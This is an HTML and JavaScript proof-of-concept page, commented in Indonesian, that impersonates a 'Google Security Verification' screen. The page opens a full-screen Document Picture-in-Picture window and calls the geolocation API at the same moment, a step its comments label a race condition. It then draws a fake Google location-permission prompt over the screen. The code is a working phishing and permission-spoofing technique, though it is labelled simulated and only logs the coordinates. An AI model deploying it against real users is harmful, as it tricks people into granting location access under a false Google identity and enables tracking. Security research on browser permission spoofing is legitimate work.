<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Security Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
  h2 { color: #4285f4; margin-bottom: 10px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
  button:hover { background: #1557b0; }
  #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 Google Security Verification</h2>
  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diminta mengizinkan lokasi.</p>
  <button id="startBtn">Verify Account & Allow Location</button>
  <div id="status">[*] Ready...</div>
</div>

<script>
(function () {
  'use strict';

  var btn = document.getElementById('startBtn');
  var statusEl = document.getElementById('status');

  function log(msg) {
    statusEl.textContent = msg;
    console.log("[Fullscreen PiP + Location] " + msg);
  }

  // ============================================
  // 1. TRIGGER (KLIK) - RACE CONDITION
  // ============================================
  btn.addEventListener('click', async function() {
    log("[*] Memulai fullscreen PiP + location race...");

    try {
      if (!window.documentPictureInPicture) {
        alert("Document Picture-in-Picture tidak didukung.");
        return;
      }

      // ============================================
      // 2. BUKA PiP (UKURAN BESAR)
      // ============================================
      const pipWindow = await documentPictureInPicture.requestWindow({
        width: 1920,
        height: 1080
      });

      log('PiP Window Opened. Size: ' + pipWindow.innerWidth + 'x' + pipWindow.innerHeight);

      // ============================================
      // 3. PAKSA FULLSCREEN
      // ============================================
      try {
        pipWindow.resizeTo(screen.width, screen.height);
        pipWindow.moveTo(0, 0);
      } catch (e) {
        log('Resize error: ' + e.message);
      }

      // ============================================
      // 4. MINTA IZIN LOKASI (RACE CONDITION)
      // ============================================
      // Panggil getCurrentPosition segera setelah PiP fullscreen.
      try {
        log("[*] Meminta Izin Lokasi...");
        
        navigator.geolocation.getCurrentPosition(
          function(position) {
            log("[+] Lokasi DIIZINKAN!");
            log("Lat: " + position.coords.latitude + ", Lon: " + position.coords.longitude);
          },
          function(error) {
            log("[-] Lokasi ditolak: " + error.message);
          },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      } catch (e) {
        log("[-] Geolocation error: " + e.message);
      }

      // ============================================
      // 5. TULIS KONTEN PiP (UI PALSU FULLSCREEN)
      // ============================================
      pipWindow.document.open();
      pipWindow.document.write(`
        <!DOCTYPE html>
        <html>
        <head>
          <meta charset="UTF-8">
          <title>Google Security Verification</title>
          <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
              background: #fff;
              display: flex;
              flex-direction: column;
              justify-content: center;
              align-items: center;
              min-height: 100vh;
              padding: 20px;
              text-align: center;
              overflow: hidden;
            }
            .g-logo {
              font-size: 64px;
              font-weight: bold;
              color: #4285f4;
              margin-bottom: 30px;
            }
            h3 { font-size: 32px; color: #333; margin-bottom: 20px; }
            p { font-size: 18px; color: #666; margin-bottom: 30px; }
            .fake-prompt {
              background: #fff;
              border: 1px solid #ddd;
              border-radius: 16px;
              padding: 40px;
              box-shadow: 0 20px 60px rgba(0,0,0,0.3);
              text-align: center;
              max-width: 500px;
              width: 100%;
            }
            .fake-prompt h4 { font-size: 24px; color: #333; margin-bottom: 15px; }
            .fake-prompt p { font-size: 16px; color: #666; margin-bottom: 30px; }
            .fake-prompt button {
              padding: 15px 40px;
              margin: 10px;
              border: none;
              border-radius: 8px;
              font-size: 18px;
              font-weight: bold;
              cursor: pointer;
            }
            .fake-prompt .allow { background: #1a73e8; color: #fff; }
            .fake-prompt .block { background: #f0f0f0; color: #333; }
            .footer {
              margin-top: 30px;
              font-size: 14px;
              color: #999;
            }
          </style>
        </head>
        <body>
          <div class="g-logo">G</div>
          <h3>Google Security Verification</h3>
          <p>Please allow location access to continue.</p>

          <div class="fake-prompt">
            <h4>accounts.google.com ingin menggunakan lokasi Anda</h4>
            <p>This is a simulated permission prompt.</p>
            <button class="block" id="fakeBlock">Blokir</button>
            <button class="allow" id="fakeAllow">Izinkan</button>
          </div>

          <div class="footer">This is a simulated phishing test. Do not enter real credentials.</div>

          <script>
            (function() {
              document.getElementById('fakeAllow').addEventListener('click', function() {
                window.location.href = 'https://www.google.com';
              });

              document.getElementById('fakeBlock').addEventListener('click', function() {
                window.close();
              });
            })();
          <\/script>
        </body>
        </html>
      `);
      pipWindow.document.close();

      log('PiP UI ready. Location prompt triggered.');

    } catch (e) {
      log('Error: ' + e.message);
    }
  }, { once: true });

})();
</script>

</body>
</html>
